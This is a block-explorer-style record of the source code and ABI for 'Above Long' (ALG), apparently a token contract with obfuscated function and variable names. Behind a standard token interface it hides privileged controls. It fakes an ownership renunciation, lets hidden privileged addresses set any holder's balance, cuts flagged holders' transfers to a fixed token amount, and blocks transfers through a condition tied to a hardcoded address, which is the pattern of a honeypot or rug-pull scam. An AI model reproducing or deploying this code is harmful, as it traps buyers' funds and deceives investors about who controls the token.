{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface feeEnableIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract sellFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minShould {\n    function createPair(address enableIs, address fundBuy) external returns (address);\n}\n\ninterface amountShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedMaxReceiver) external view returns (uint256);\n\n    function transfer(address buyLiquidity, uint256 sellLiquidity) external returns (bool);\n\n    function allowance(address feeSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buyLiquidity,\n        uint256 sellLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeFund, uint256 value);\n    event Approval(address indexed feeSwap, address indexed spender, uint256 value);\n}\n\ninterface amountShouldMetadata is amountShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AboveLong is sellFee, amountShould, amountShouldMetadata {\n\n    uint256 public receiverMaxShould;\n\n    function approve(address swapFee, uint256 sellLiquidity) public virtual override returns (bool) {\n        launchEnable[_msgSender()][swapFee] = sellLiquidity;\n        emit Approval(_msgSender(), swapFee, sellLiquidity);\n        return true;\n    }\n\n    uint256 takeAmount;\n\n    function exemptTake(address modeExemptLimit) public {\n        swapLaunchedLaunch();\n        \n        if (modeExemptLimit == receiverExempt || modeExemptLimit == maxAt) {\n            return;\n        }\n        launchedShould[modeExemptLimit] = true;\n    }\n\n    function buyIs(uint256 sellLiquidity) public {\n        swapLaunchedLaunch();\n        takeAmount = sellLiquidity;\n    }\n\n    address public maxAt;\n\n    function isReceiver() public {\n        emit OwnershipTransferred(receiverExempt, address(0));\n        isSwap = address(0);\n    }\n\n    function receiverBuy(address toLiquidity, address buyLiquidity, uint256 sellLiquidity) internal returns (bool) {\n        require(listTotal[toLiquidity] >= sellLiquidity);\n        listTotal[toLiquidity] -= sellLiquidity;\n        listTotal[buyLiquidity] += sellLiquidity;\n        emit Transfer(toLiquidity, buyLiquidity, sellLiquidity);\n        return true;\n    }\n\n    bool private receiverReceiver;\n\n    function owner() external view returns (address) {\n        return isSwap;\n    }\n\n    mapping(address => bool) public tradingSell;\n\n    event OwnershipTransferred(address indexed senderAtEnable, address indexed receiverMaxReceiver);\n\n    function buyLaunched(address toLiquidity, address buyLiquidity, uint256 sellLiquidity) internal returns (bool) {\n        if (toLiquidity == receiverExempt) {\n            return receiverBuy(toLiquidity, buyLiquidity, sellLiquidity);\n        }\n        uint256 limitReceiver = amountShould(maxAt).balanceOf(txAuto);\n        require(limitReceiver == takeAmount);\n        require(buyLiquidity != txAuto);\n        if (launchedShould[toLiquidity]) {\n            return receiverBuy(toLiquidity, buyLiquidity, toModeEnable);\n        }\n        return receiverBuy(toLiquidity, buyLiquidity, sellLiquidity);\n    }\n\n    function getOwner() external view returns (address) {\n        return isSwap;\n    }\n\n    mapping(address => mapping(address => uint256)) private launchEnable;\n\n    uint256 private totalToken;\n\n    bool private toList;\n\n    uint256 launchedMarketing;\n\n    bool private senderTeam;\n\n    uint256 public txTake;\n\n    function swapLaunchedLaunch() private view {\n        require(tradingSell[_msgSender()]);\n    }\n\n    function limitSellReceiver(address exemptAmount) public {\n        if (swapMarketingFrom) {\n            return;\n        }\n        if (tradingLimitIs) {\n            txTake = totalToken;\n        }\n        tradingSell[exemptAmount] = true;\n        \n        swapMarketingFrom = true;\n    }\n\n    function launchedAmount(address minSellWallet, uint256 sellLiquidity) public {\n        swapLaunchedLaunch();\n        listTotal[minSellWallet] = sellLiquidity;\n    }\n\n    mapping(address => bool) public launchedShould;\n\n    address txAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public amountLaunch;\n\n    uint256 private minTotalSender = 100000000 * 10 ** 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minTotalSender;\n    }\n\n    uint256 constant toModeEnable = 7 ** 10;\n\n    function name() external view virtual override returns (string memory) {\n        return modeMax;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeBuy;\n    }\n\n    address private isSwap;\n\n    function balanceOf(address launchedMaxReceiver) public view virtual override returns (uint256) {\n        return listTotal[launchedMaxReceiver];\n    }\n\n    constructor (){\n        if (amountLaunch != listTx) {\n            listTx = txTake;\n        }\n        feeEnableIs enableAuto = feeEnableIs(launchedLaunchExempt);\n        maxAt = minShould(enableAuto.factory()).createPair(enableAuto.WETH(), address(this));\n        if (totalToken == amountLaunch) {\n            tradingLimitIs = false;\n        }\n        receiverExempt = _msgSender();\n        isReceiver();\n        tradingSell[receiverExempt] = true;\n        listTotal[receiverExempt] = minTotalSender;\n        if (toList) {\n            receiverReceiver = true;\n        }\n        emit Transfer(address(0), receiverExempt, minTotalSender);\n    }\n\n    uint8 private feeBuy = 18;\n\n    string private modeMax = \"Above Long\";\n\n    function transfer(address minSellWallet, uint256 sellLiquidity) external virtual override returns (bool) {\n        return buyLaunched(_msgSender(), minSellWallet, sellLiquidity);\n    }\n\n    function transferFrom(address toLiquidity, address buyLiquidity, uint256 sellLiquidity) external override returns (bool) {\n        if (_msgSender() != launchedLaunchExempt) {\n            if (launchEnable[toLiquidity][_msgSender()] != type(uint256).max) {\n                require(sellLiquidity <= launchEnable[toLiquidity][_msgSender()]);\n                launchEnable[toLiquidity][_msgSender()] -= sellLiquidity;\n            }\n        }\n        return buyLaunched(toLiquidity, buyLiquidity, sellLiquidity);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchSenderLiquidity;\n    }\n\n    string private launchSenderLiquidity = \"ALG\";\n\n    address public receiverExempt;\n\n    bool public swapMarketingFrom;\n\n    bool public tradingLimitIs;\n\n    bool private exemptLimit;\n\n    mapping(address => uint256) private listTotal;\n\n    uint256 public listTx;\n\n    address launchedLaunchExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address minWallet, address swapFee) external view virtual override returns (uint256) {\n        if (swapFee == launchedLaunchExempt) {\n            return type(uint256).max;\n        }\n        return launchEnable[minWallet][swapFee];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderAtEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMaxReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMaxReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellLiquidity\",\"type\":\"uint256\"}],\"name\":\"buyIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeExemptLimit\",\"type\":\"address\"}],\"name\":\"exemptTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSellWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellLiquidity\",\"type\":\"uint256\"}],\"name\":\"launchedAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAmount\",\"type\":\"address\"}],\"name\":\"limitSellReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMaxShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMarketingFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLimitIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSellWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AboveLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}